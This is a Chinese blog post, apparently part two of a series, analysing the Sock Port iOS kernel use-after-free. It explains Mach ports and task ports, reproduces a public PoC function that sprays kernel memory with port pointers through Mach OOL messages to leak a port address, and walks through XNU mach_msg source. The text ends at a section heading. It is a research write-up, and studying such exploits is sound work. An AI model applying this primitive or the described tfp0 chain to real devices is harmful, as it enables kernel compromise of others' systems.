<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address"><meta name="keywords" content="Sock Port,UAF,Mach,Mach Port"><meta name="author" content="高级页面仔 (Soulghost)"><meta name="copyright" content="高级页面仔 (Soulghost)"><title>Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address | iOS Security Cabin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#系列文章"><span class="toc-number">1.</span> <span class="toc-text">系列文章</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mach-port-是什么"><span class="toc-number">3.</span> <span class="toc-text">Mach port 是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#定义"><span class="toc-number">3.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mach-port-对应的内核对象"><span class="toc-number">3.2.</span> <span class="toc-text">Mach port 对应的内核对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内核中的-Task-对象"><span class="toc-number">3.3.</span> <span class="toc-text">内核中的 Task 对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-amp-Task-与进程的对应关系"><span class="toc-number">3.4.</span> <span class="toc-text">Port &amp; Task 与进程的对应关系</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sock-Port-概览"><span class="toc-number">4.</span> <span class="toc-text">Sock Port 概览</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#获取-Port-Address-的思路"><span class="toc-number">5.</span> <span class="toc-text">获取 Port Address 的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#迫使内核分配-Task-port-pointer"><span class="toc-number">5.1.</span> <span class="toc-text">迫使内核分配 Task port pointer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#从-XNU-源码分析-Mach-OOL-Message"><span class="toc-number">6.</span> <span class="toc-text">从 XNU 源码分析 Mach OOL Message</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#构造-kmsg"><span class="toc-number">6.1.</span> <span class="toc-text">构造 kmsg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#将用户空间的-mach-message-剩余部分复制到-kmsg"><span class="toc-number">6.2.</span> <span class="toc-text">将用户空间的 mach message 剩余部分复制到 kmsg</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#通过-OOL-Message-与-Socket-UAF-获取-Port-Address"><span class="toc-number">7.</span> <span class="toc-text">通过 OOL Message 与 Socket UAF 获取 Port Address</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#通过-Socket-Option-读取一个-8B-区域"><span class="toc-number">7.1.</span> <span class="toc-text">通过 Socket Option 读取一个 8B 区域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断是否是内核对象指针的地址"><span class="toc-number">7.2.</span> <span class="toc-text">判断是否是内核对象指针的地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#下节预告"><span class="toc-number">9.</span> <span class="toc-text">下节预告</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">10.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://avatars0.githubusercontent.com/u/6300263?s=460&amp;u=c55866a279854c9150528b358802a75be5e6a507&amp;v=4"></div><div class="author-info__name text-center">高级页面仔 (Soulghost)</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">8</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">15</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">iOS Security Cabin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-24</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h1><ol>
<li><a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a></li>
</ol>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在上一篇文章中，我们初步介绍了 UAF 原理，并提到了 iOS 10.0 - 12.2 的 Socket 代码中含有一个针对 <code>in6p_outputopts</code> 的 UAF Exploit，它是整个 Sock Port 漏洞的关键。从这篇文章开始，我们将逐行分析 <a href="https://github.com/jakeajames/sock_port/tree/sock_port_2" target="_blank" rel="noopener">Sock Port 2 的 Public PoC 源码</a>，并结合 XNU 源码进行深入分析和解释。</p>
<h1 id="Mach-port-是什么"><a href="#Mach-port-是什么" class="headerlink" title="Mach port 是什么"></a>Mach port 是什么</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在介绍 Sock Port 之前，我们需要先引入 Mach port 的概念[1]：</p>
<blockquote>
<p>Mach ports are a kernel-provided inter-process communication (IPC) mechanism used heavily throughout the operating system. A Mach port is a unidirectional, kernel-protected channel that can have multiple send endpoints and only one receive endpoint.</p>
</blockquote>
<p>即 Mach ports 是内核提供的进程间通信机制，它被操作系统频繁的使用。一个 Mach port 是一个受内核保护的单向管道，它可以有多个发送端，但只能有一个接收端。</p>
<h2 id="Mach-port-对应的内核对象"><a href="#Mach-port-对应的内核对象" class="headerlink" title="Mach port 对应的内核对象"></a>Mach port 对应的内核对象</h2><p>Mach port 在用户态以 <code>mach_port_t</code> 句柄的形式存在，在内核空间中每个 <code>mach_port_t</code> 句柄都有相对应的内核对象 <code>ipc_port</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> <span class="title">ip_object</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_mqueue</span> <span class="title">ip_messages</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> *<span class="title">receiver</span>;</span></span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">destination</span>;</span></span><br><span class="line">    	<span class="keyword">ipc_port_timestamp_t</span> timestamp;</span><br><span class="line">    &#125; data;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">    	<span class="keyword">ipc_kobject_t</span> kobject; <span class="comment">// task</span></span><br><span class="line">    	<span class="keyword">ipc_importance_task_t</span> imp_task;</span><br><span class="line">    	<span class="keyword">ipc_port_t</span> sync_inheritor_port;</span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">knote</span> *<span class="title">sync_inheritor_knote</span>;</span></span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">turnstile</span> *<span class="title">sync_inheritor_ts</span>;</span></span><br><span class="line">    &#125; kdata;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>其中比较关键的是 +0x68 处的 <code>kobject</code> 成员，它是一个 <code>task</code> 对象，根据 Apple 给出的文档：Task 是拥有资源的单位，它包含了虚拟地址空间、mach ports 空间以及线程空间[2]，它类似于进程的概念，在这里我们可以简单地理解为<strong>每个进程都有其对应的 Task，内核通过 Task 可以管理进程资源，并通过这种机制实现进程间通信</strong>。</p>
<h2 id="内核中的-Task-对象"><a href="#内核中的-Task-对象" class="headerlink" title="内核中的 Task 对象"></a>内核中的 Task 对象</h2><p>Task 在内核中的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* Virtual address space */</span></span><br><span class="line">    <span class="keyword">vm_map_t</span>	<span class="built_in">map</span>;		<span class="comment">/* Address space description */</span></span><br><span class="line">    <span class="keyword">queue_chain_t</span>	tasks;	<span class="comment">/* global list of tasks */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* Threads in this task */</span></span><br><span class="line">    <span class="keyword">queue_head_t</span>		threads;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* Port right namespace */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> *<span class="title">itk_space</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Proc info */</span></span><br><span class="line">    <span class="keyword">void</span> *bsd_info;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>上述代码中的 <code>map</code>, <code>threads</code> 和 <code>itk_space</code> 分别对应了上述对 Task 拥有的虚拟地址空间、mach ports 命名空间以及线程空间，而 <code>bsd_info</code> 是一个 Proc 对象，它包含了当前进程信息，例如我们熟悉的 <code>PID</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>	<span class="title">proc</span> &#123;</span></span><br><span class="line">    LIST_ENTRY(proc) p_list;    <span class="comment">/* List of all processes. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * 		task;   <span class="comment">/* corresponding task (static)*/</span></span><br><span class="line">    <span class="keyword">pid_t</span>		p_ppid; <span class="comment">/* process's parent pid number */</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">pid_t</span>		p_pid;  <span class="comment">/* Process identifier. (static)*/</span></span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h2 id="Port-amp-Task-与进程的对应关系"><a href="#Port-amp-Task-与进程的对应关系" class="headerlink" title="Port &amp; Task 与进程的对应关系"></a>Port &amp; Task 与进程的对应关系</h2><p>在用户态我们可以通过 <code>mach_task_self_</code> 变量或是 <code>mach_task_self()</code> 宏函数拿到当前进程的 <code>Task port</code>，所谓 <code>Task port</code> 即是指包含了该进程对应的 <code>Task</code> 作为其 <code>kobject</code> 的任务端口，拥有该端口即可对相应的进程“为所欲为”。</p>
<p>因此，只要我们能在用户态获取到内核的 <code>Task port</code>，就能对内核为所欲为。Sock Port 本质上就是在用户态伪造了一个合法的内核 <code>Task port</code>（又被称之为 <code>task_for_pid(0)</code> ，即 <code>tfp0</code>）。</p>
<h1 id="Sock-Port-概览"><a href="#Sock-Port-概览" class="headerlink" title="Sock Port 概览"></a>Sock Port 概览</h1><p>Sock Port 漏洞通过 Socket in6p_outputopts UAF 主要实现了 3 个 Exploit Primitive：</p>
<ol>
<li><code>mach_port</code> 句柄对应的 <code>ipc_port</code> 地址泄露，通过这种方式我们可以拿到应用自身进程的 <code>Task port</code>；</li>
<li>借助于操作 <code>in6p_outputopts</code> 的成员实现了不稳定的内核内存读取；</li>
<li>借助于操作 <code>in6p_outputopts</code> 的成员实现了内核中任意大小 zone 的释放。</li>
</ol>
<p>Sock Port 通过组合这些 Primitive，先是通过 Socket UAF 获得了一个可控的内核地址空间，随后通过 Mach OOL Message 将这些空间填充成 <code>ipc_port</code> 的地址，最后偷梁换柱的用伪造的 <code>ipc_port</code> 对其进行替换，此时我们能够得到一个合法、可控的 <code>ipc_port</code>。</p>
<p>随后我们通过读取自身进程 <code>Task port</code> 的 <code>bsd_info</code> 以及 <code>task_prev</code> 枚举所有进程，直到 pid = 0 我们便拿到了 Kernel Task，从 Kernel Task 中取出 Kernel Map 赋予我们伪造的 <code>ipc_port</code>，此时我们便将伪造的 <code>ipc_port</code> 伪装成了一个真正的 <code>Kernel Task port</code>。</p>
<p>以上是对 Sock Port 的一个概述，详细的利用过程涉及到 XNU 的诸多知识，且每一步都富含细节，到这里读者只需要对该漏洞有个整体认识，在接下来的文章中会一步步分析这些 Primitive 的原理，以及组合 Primitives 实现 tfp0 的详细过程。</p>
<h1 id="获取-Port-Address-的思路"><a href="#获取-Port-Address-的思路" class="headerlink" title="获取 Port Address 的思路"></a>获取 Port Address 的思路</h1><p>漏洞的第一个关键是获取到当前进程的 Task port 地址，这也是本文重点分析的内容。常规情况下，在用户态我们只能拿到 Task port 的句柄，若要拿到地址，有两个思路：</p>
<ol>
<li>泄露当前进程的 port 索引表，并通过句柄查询 port 的实际地址；</li>
<li>通过某种方式迫使内核分配 Task port 的指针到我们可读的内核区域，即 UAF 方式。</li>
</ol>
<p>事实上当前进程的 port 索引表是被 Task port 所间接引用的，即常规情况下我们需要先知道 Task port address 才能获取到 port 索引表的位置，因此方式 1 不可行。实现方式 2 的关键点有两个：UAF &amp; 分配 Task port pointer，前者已经通过 Socket UAF 满足，现在只差后者。</p>
<h2 id="迫使内核分配-Task-port-pointer"><a href="#迫使内核分配-Task-port-pointer" class="headerlink" title="迫使内核分配 Task port pointer"></a>迫使内核分配 Task port pointer</h2><p>在 Sock Port 中有一段关键代码，用于为指定的 <code>target port</code> 句柄在内核中分配可控数量的 <code>ipc_port</code> 指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from Ian Beer. make a kernel allocation with the kernel address of 'target_port', 'count' times</span></span><br><span class="line"><span class="function"><span class="keyword">mach_port_t</span> <span class="title">fill_kalloc_with_port_pointer</span><span class="params">(<span class="keyword">mach_port_t</span> target_port, <span class="keyword">int</span> count, <span class="keyword">int</span> disposition)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">mach_port_t</span> q = MACH_PORT_NULL;</span><br><span class="line">    <span class="keyword">kern_return_t</span> err;</span><br><span class="line">    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;q);</span><br><span class="line">    <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] failed to allocate port\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mach_port_t</span>* ports = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">mach_port_t</span>) * count);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        ports[i] = target_port;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ool_msg</span>* <span class="title">msg</span> = (<span class="title">struct</span> <span class="title">ool_msg</span>*)<span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ool_msg</span>));</span></span><br><span class="line">    </span><br><span class="line">    msg-&gt;hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, <span class="number">0</span>);</span><br><span class="line">    msg-&gt;hdr.msgh_size = (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(struct ool_msg);</span><br><span class="line">    msg-&gt;hdr.msgh_remote_port = q;</span><br><span class="line">    msg-&gt;hdr.msgh_local_port = MACH_PORT_NULL;</span><br><span class="line">    msg-&gt;hdr.msgh_id = <span class="number">0x41414141</span>;</span><br><span class="line">    </span><br><span class="line">    msg-&gt;body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    msg-&gt;ool_ports.address = ports;</span><br><span class="line">    msg-&gt;ool_ports.count = count;</span><br><span class="line">    msg-&gt;ool_ports.deallocate = <span class="number">0</span>;</span><br><span class="line">    msg-&gt;ool_ports.disposition = disposition;</span><br><span class="line">    msg-&gt;ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;</span><br><span class="line">    msg-&gt;ool_ports.copy = MACH_MSG_PHYSICAL_COPY;</span><br><span class="line">    </span><br><span class="line">    err = mach_msg(&amp;msg-&gt;hdr,</span><br><span class="line">                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,</span><br><span class="line">                   msg-&gt;hdr.msgh_size,</span><br><span class="line">                   <span class="number">0</span>,</span><br><span class="line">                   MACH_PORT_NULL,</span><br><span class="line">                   MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                   MACH_PORT_NULL);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] failed to send message: %s\n"</span>, mach_error_string(err));</span><br><span class="line">        <span class="keyword">return</span> MACH_PORT_NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码所做的事情有三个：</p>
<ol>
<li>分配一个接收端口 q 用于接收 Mach OOL Message；</li>
<li>构造一个 Mach OOL Message，并用想要获取地址的 <code>target port</code> 填充；</li>
<li>向接收端口 q 发送 Mach Message，<strong>由于 Mach Message 先经过内核，会在内核中对 OOL Message 进行复制，在复制过程中句柄会被转为地址</strong>。</li>
</ol>
<p>这个地方的一个关键是 OOL Message，它是触发内核复制的关键。OOL Message 的全称是 Out-of-line Message，之所以称之为 out of line，是因为它的消息体中包含了 Out-of-line Memory，而 Out-of-line Memory 即接收者虚拟地址空间以外的内容。根据 <a href="https://www.gnu.org/software/hurd/gnumach-doc/Memory.html" target="_blank" rel="noopener">GNU Doc</a>，Out-of-line Memory 会在接受者的空间进行 copyin 操作，<strong>有意思的事情在于如果 out-of-line 的是 <code>mach_port</code> 句柄，在 copy 时会将其转换为句柄对应的 <code>ipc_port</code> 的地址</strong>。</p>
<p>到这里我们已经了解了通过 OOL Message 迫使内核分配 port address 的方法，但知其然就要知其所以然，接下来我们从 XNU 源码入手分析着这整个过程。</p>
<h1 id="从-XNU-源码分析-Mach-OOL-Message"><a href="#从-XNU-源码分析-Mach-OOL-Message" class="headerlink" title="从 XNU 源码分析 Mach OOL Message"></a>从 XNU 源码分析 Mach OOL Message</h1><p>笔者分析使用的 XNU 版本为 xnu-4903.221.2，分析时所在的 commit hash 为 a449c6a3b8014d9406c2ddbdc81795da24aa7443。</p>
<p>我们直接从发送消息的 <code>mach_msg</code> 函数入手分析，打断点可知 <code>mach_msg</code> 最终会调用到内核的 <code>mach_msg_trap</code> 函数，我们打开 XNU 源码可以看到 <code>mach_msg_trap</code> 其实是对 <code>mach_msg_overwrite_trap</code> 的简单封装：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">mach_msg_trap(</span><br><span class="line">	struct mach_msg_overwrite_trap_args *args)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr;</span><br><span class="line">    args-&gt;rcv_msg = (<span class="keyword">mach_vm_address_t</span>)<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    kr = mach_msg_overwrite_trap(args);</span><br><span class="line">    <span class="keyword">return</span> kr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们去看 <code>mach_msg_overwrite_trap</code> 函数，首先看到函数的开头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">mach_msg_overwrite_trap(</span><br><span class="line">	struct mach_msg_overwrite_trap_args *args)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">mach_vm_address_t</span>	msg_addr = args-&gt;msg;</span><br><span class="line">    <span class="keyword">mach_msg_option_t</span>	option = args-&gt;option;</span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>	send_size = args-&gt;send_size;</span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>	rcv_size = args-&gt;rcv_size;</span><br><span class="line">    <span class="keyword">mach_port_name_t</span>	rcv_name = args-&gt;rcv_name;</span><br><span class="line">    <span class="keyword">mach_msg_timeout_t</span>	msg_timeout = args-&gt;timeout;</span><br><span class="line">    <span class="keyword">mach_msg_priority_t</span> <span class="keyword">override</span> = args-&gt;<span class="keyword">override</span>;</span><br><span class="line">    <span class="keyword">mach_vm_address_t</span>	rcv_msg_addr = args-&gt;rcv_msg;</span><br><span class="line">    __unused <span class="keyword">mach_port_seqno_t</span> temp_seqno = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mach_msg_return_t</span>  mr = MACH_MSG_SUCCESS;</span><br><span class="line">    <span class="keyword">vm_map_t</span> <span class="built_in">map</span> = current_map();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Only accept options allowed by the user */</span></span><br><span class="line">    option &amp;= MACH_MSG_OPTION_USER;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (option &amp; MACH_SEND_MSG) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (option &amp; MACH_RCV_MSG) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>先是从 args 中解出用户态传入的参数，随后准备了后续处理所需的环境，接下来的代码是对 option 的判断，可见收发消息共用了一个函数，由于我们传入的 option 包含了 <code>MACH_SEND_MSG</code>，接下来会走到消息发送的分支逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (option &amp; MACH_SEND_MSG) &#123;</span><br><span class="line">    <span class="keyword">ipc_space_t</span> space = current_space();</span><br><span class="line">    <span class="keyword">ipc_kmsg_t</span> kmsg;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. create kmsg and copy header</span></span><br><span class="line">    mr = ipc_kmsg_get(msg_addr, send_size, &amp;kmsg);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mr != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">    	<span class="keyword">return</span> mr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. copy body</span></span><br><span class="line">    mr = ipc_kmsg_copyin(kmsg, space, <span class="built_in">map</span>, <span class="keyword">override</span>, &amp;option);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mr != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">    	ipc_kmsg_free(kmsg);</span><br><span class="line">    	<span class="keyword">return</span> mr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. send message</span></span><br><span class="line">    mr = ipc_kmsg_send(kmsg, option, msg_timeout);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mr != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">    	mr |= ipc_kmsg_copyout_pseudo(kmsg, space, <span class="built_in">map</span>, MACH_MSG_BODY_NULL);</span><br><span class="line">    	(<span class="keyword">void</span>) ipc_kmsg_put(kmsg, option, msg_addr, send_size, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    	<span class="keyword">return</span> mr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在消息发送的分支逻辑中有三个关键步骤：</p>
<ol>
<li>通过 mach message 创建一个 kmsg，kmsg 是 mach message 在内核中的数据结构；</li>
<li>将 mach message body 复制到 kmsg 中；</li>
<li>发送 kmsg。</li>
</ol>
<p>下面我们将详细讲解前两个步骤，他们是整个 Mach OOL Message Spraying 的关键：</p>
<h2 id="构造-kmsg"><a href="#构造-kmsg" class="headerlink" title="构造 kmsg"></a>构造 kmsg</h2><p>内核通过调用 <code>ipc_kmsg_get</code> 实现了 kmsg 构造，下面是 <code>ipc_kmsg_get</code> <strong>去除了 debug 信息与一些判断逻辑外</strong>的全貌：</p>
